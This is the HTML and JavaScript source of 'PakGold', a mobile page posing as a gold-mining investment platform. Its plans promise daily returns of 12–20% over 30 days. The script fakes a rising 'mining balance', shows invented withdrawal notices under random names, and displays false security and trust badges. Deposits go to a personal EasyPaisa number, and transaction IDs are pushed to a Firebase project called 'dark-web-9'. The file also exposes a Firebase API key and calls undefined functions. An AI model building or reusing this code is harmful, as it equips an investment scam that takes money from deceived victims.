<!DOCTYPE html>
<html lang="en">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>PakGold | Professional Mining & Investment</title>
    <link href="https://fonts.googleapis.com/css2?family=Outfit:wght@300;400;600;800&display=swap" rel="stylesheet">
    <style>
        :root { --gold: #d4af37; --gold-dark: #b8860b; --bg: #f8fafc; --text: #1e293b; --white: #ffffff; }
        * { margin: 0; padding: 0; box-sizing: border-box; font-family: 'Outfit', sans-serif; }
        body { background: var(--bg); color: var(--text); overflow-x: hidden; }

        /* --- Animations --- */
        @keyframes fadeIn { from { opacity: 0; transform: translateY(15px); } to { opacity: 1; transform: translateY(0); } }
        @keyframes pulse { 0% { box-shadow: 0 0 0 0 rgba(212,175,55,0.5); } 70% { box-shadow: 0 0 0 15px rgba(212,175,55,0); } 100% { box-shadow: 0 0 0 0 rgba(212,175,55,0); } }
        
        .section { display: none; width: 100%; min-height: 100vh; position: absolute; top: 0; left: 0; }
        .section.active { display: block; position: relative; animation: fadeIn 0.5s ease-out; }

        /* --- Live Payout Toast --- */
        #payout-toast {
            position: fixed; bottom: 90px; left: 20px; background: var(--white);
            padding: 12px 20px; border-radius: 18px; box-shadow: 0 10px 30px rgba(0,0,0,0.1);
            display: flex; align-items: center; gap: 12px; font-size: 0.8rem;
            transform: translateX(-150%); transition: 0.6s cubic-bezier(0.175, 0.885, 0.32, 1.275); z-index: 5000;
            border-left: 5px solid var(--gold);
        }

        /* --- Login Page --- */
        #login-page { background: var(--white); display: flex; align-items: center; justify-content: center; z-index: 100; }
        .login-card { width: 90%; max-width: 380px; text-align: center; padding: 40px 25px; background: var(--white); border-radius: 35px; box-shadow: 0 20px 50px rgba(0,0,0,0.05); }
        .logo-circle { width: 80px; height: 80px; background: var(--gold); border-radius: 50%; margin: 0 auto 20px; display: flex; align-items: center; justify-content: center; font-size: 2rem; color: white; animation: pulse 2s infinite; }

        /* --- Dashboard Header --- */
        .header { background: var(--white); padding: 40px 20px; text-align: center; border-radius: 0 0 50px 50px; border-bottom: 4px solid var(--gold); box-shadow: 0 10px 30px rgba(0,0,0,0.02); }
        .bal-display { font-size: 2.8rem; font-weight: 800; color: var(--gold-dark); margin: 10px 0; }
        .badge-row { display: flex; justify-content: center; gap: 10px; margin-top: 15px; }
        .badge { font-size: 0.65rem; background: #f1f5f9; padding: 5px 12px; border-radius: 10px; color: #64748b; font-weight: 600; }

        /* --- Plan Cards --- */
        .container { padding: 25px 20px 120px; }
        .plan-card { background: var(--white); border-radius: 25px; padding: 25px; margin-bottom: 20px; border: 1px solid #edf2f7; position: relative; overflow: hidden; transition: 0.3s; }
        .plan-card:hover { transform: translateY(-5px); box-shadow: 0 15px 30px rgba(0,0,0,0.05); }
        .hot-tag { position: absolute; top: 12px; right: -25px; background: #ff4757; color: white; font-size: 0.6rem; padding: 4px 30px; transform: rotate(45deg); font-weight: 800; }

        /* --- Buttons & Inputs --- */
        .input-box { width: 100%; padding: 18px; margin: 10px 0; border-radius: 15px; border: 1px solid #e2e8f0; background: #f8fafc; outline: none; font-size: 1rem; }
        .btn-gold { background: linear-gradient(135deg, var(--gold), var(--gold-dark)); color: white; border: none; padding: 18px; border-radius: 15px; width: 100%; font-weight: 700; cursor: pointer; box-shadow: 0 8px 20px rgba(184, 134, 11, 0.2); font-size: 1rem; }

        /* --- Bottom Menu --- */
        .bottom-nav { position: fixed; bottom: 0; width: 100%; background: var(--white); display: none; justify-content: space-around; padding: 20px; border-top: 1px solid #f1f5f9; border-radius: 30px 30px 0 0; box-shadow: 0 -10px 30px rgba(0,0,0,0.05); z-index: 4000; }
        .nav-tab { color: #94a3b8; font-size: 0.75rem; text-align: center; cursor: pointer; transition: 0.3s; }
        .nav-tab.active-tab { color: var(--gold-dark); font-weight: 700; }
    </style>
</head>
<body onload="checkUser()">

    <!-- Live Trust Notification -->
    <div id="payout-toast">
        <div style="width:12px; height:12px; background:#2ed573; border-radius:50%;"></div>
        <span id="toast-text">Loading updates...</span>
    </div>

    <!-- 1. LOGIN SECTION -->
    <section id="login-page" class="section active">
        <div class="login-card">
            <div class="logo-circle">⚜️</div>
            <h1 style="color:var(--gold-dark); font-size: 2.2rem; font-weight:800;">PakGold</h1>
            <p style="color:#64748b; margin-bottom: 30px;">Premium Mining Solutions</p>
            <input type="text" id="ph" class="input-box" placeholder="Phone Number">
            <input type="password" id="ps" class="input-box" placeholder="Password">
            <button class="btn-gold" onclick="login()">SECURE LOGIN</button>
            <p style="margin-top:20px; font-size:0.7rem; color:#cbd5e1;">Trusted by 50K+ Miners</p>
        </div>
    </section>

    <!-- 2. DASHBOARD SECTION -->
    <section id="dash-page" class="section">
        <div class="header">
            <p style="font-size:0.7rem; letter-spacing:2px; color:#94a3b8; cursor:pointer;" onclick="adminCall()">PAK GOLD SOLUTIONS (PVT) LTD</p>
            <p style="font-size:0.9rem; margin-top:15px; opacity:0.7;">Mining Balance</p>
            <div class="bal-display" id="bal-val">Rs 0.0000</div>
            <div class="badge-row">
                <span class="badge">🔒 SSL ENCRYPTED</span>
                <span class="badge">✔️ VERIFIED</span>
            </div>
        </div>

        <div class="container">
            <!-- Secret Admin Box -->
            <div id="admin-box" style="display:none; margin-bottom:20px;" class="card">
                <input type="text" id="ak" class="input-box" placeholder="Admin Key">
                <button class="btn-gold" onclick="openAdmin()">ACCESS DATA</button>
            </div>

            <h3 style="margin-bottom:20px; font-weight:700;">Investment Plans</h3>
            <div id="plan-list">
                <!-- Plans injected by JS -->
            </div>
        </div>
    </section>

    <!-- 3. DEPOSIT & WITHDRAW (Minimal Example) -->
    <section id="deposit-page" class="section">
        <div class="header"><h2>Add Funds</h2></div>
        <div class="container">
            <div class="plan-card">
                <p><b>EasyPaisa:</b> 03379827882</p>
                <input type="number" id="d-amt" class="input-box" placeholder="Amount">
                <input type="text" id="d-tid" class="input-box" placeholder="TID Number">
                <button class="btn-gold" onclick="sendReq('Deposit')">PROCEED</button>
            </div>
        </div>
    </section>

    <!-- NAVIGATION -->
    <nav class="bottom-nav" id="nav-bar">
        <div class="nav-tab active-tab" onclick="nav('dash-page')">🏠<br>Home</div>
        <div class="nav-tab" onclick="nav('deposit-page')">💰<br>Deposit</div>
        <div class="nav-tab" onclick="logout()">🚪<br>Logout</div>
    </nav>

    <script type="module">
        import { initializeApp } from "https://www.gstatic.com/firebasejs/10.7.1/firebase-app.js";
        import { getDatabase, ref, push, onValue } from "https://www.gstatic.com/firebasejs/10.7.1/firebase-database.js";

        const firebaseConfig = {
            apiKey: "AIzaSyCMG6KG_oD8cjEk4YpbxXik-C5q8K5MDHk",
            authDomain: "dark-web-9.firebaseapp.com",
            projectId: "dark-web-9",
            storageBucket: "dark-web-9.firebasestorage.app",
            messagingSenderId: "564328425161",
            appId: "1:564328425161:web:eb109ab77356dafe7f4f18"
        };
        const app = initializeApp(firebaseConfig);
        const db = getDatabase(app);

        // --- Plans Data ---
        const plans = [
            { n: "Nano", p: 500, d: 60, h: false },
            { n: "Starter", p: 1000, d: 130, h: true },
            { n: "Silver", p: 3000, d: 420, h: false },
            { n: "Gold Pro", p: 8000, d: 1200, h: true },
            { n: "Elite I", p: 25000, d: 4800, h: false },
            { n: "Elite II", p: 50000, d: 10000, h: true }
        ];

        window.checkUser = function() {
            const list = document.getElementById('plan-list');
            plans.forEach(p => {
                list.innerHTML += `
                    <div class="plan-card">
                        ${p.h ? '<div class="hot-tag">HOT</div>' : ''}
                        <h4 style="color:var(--gold-dark)">${p.n} Plan</h4>
                        <h2 style="margin:8px 0;">Rs ${p.p}</h2>
                        <p style="font-size:0.75rem; color:#64748b;">Daily Return: Rs ${p.d} | 30 Days</p>
                        <button class="btn-gold" style="margin-top:15px; padding:12px;" onclick="buy(${p.p}, ${p.d})">ACTIVATE</button>
                    </div>`;
            });

            if(localStorage.getItem('user')) { nav('dash-page'); startEngine(); startToast(); }
        }

        window.login = function() {
            let p = document.getElementById('ph').value;
            if(p.length < 10) return alert("Valid info please sweetie! 💋");
            localStorage.setItem('user', p);
            localStorage.setItem('bal', 0.0);
            localStorage.setItem('speed', 0.0001);
            location.reload();
        }

        window.nav = function(id) {
            document.querySelectorAll('.section').forEach(s => s.classList.remove('active'));
            document.getElementById(id).classList.add('active');
            document.getElementById('nav-bar').style.display = (id==='login-page')? 'none' : 'flex';
        }

        function startEngine() {
            setInterval(() => {
                let b = parseFloat(localStorage.getItem('bal')) + parseFloat(localStorage.getItem('speed'));
                localStorage.setItem('bal', b);
                if(document.getElementById('bal-val')) document.getElementById('bal-val').innerText = "Rs " + b.toFixed(4);
            }, 1000);
        }

        function startToast() {
            const names = ["Zia", "Musa", "Kiran", "Sana", "Waqas", "Esha"];
            setInterval(() => {
                let n = names[Math.floor(Math.random()*names.length)];
                let a = (Math.random()*5000 + 500).toFixed(0);
                document.getElementById('toast-text').innerHTML = `<b>${n}</b> just withdrew <b>Rs ${a}</b>!`;
                document.getElementById('payout-toast').style.transform = "translateX(0)";
                setTimeout(() => { document.getElementById('payout-toast').style.transform = "translateX(-150%)"; }, 4000);
            }, 9000);
        }

        window.sendReq = function(type) {
            const a = document.getElementById('d-amt').value;
            const t = document.getElementById('d-tid').value;
            push(ref(db, 'requests/'), { type, a, t, user: localStorage.getItem('user'), time: new Date().toLocaleString() })
            .then(() => { alert("Sent! Admin will verify soon sweetie. 💋"); nav('dash-page'); });
        }

        window.logout = function() { localStorage.clear(); location.reload(); }
        
        // Admin Secret
        let c = 0; window.adminCall = () => { c++; if(c>=5) { document.getElementById('admin-box').style.display='block'; c=0; } }
    </script>
</body>
</html>
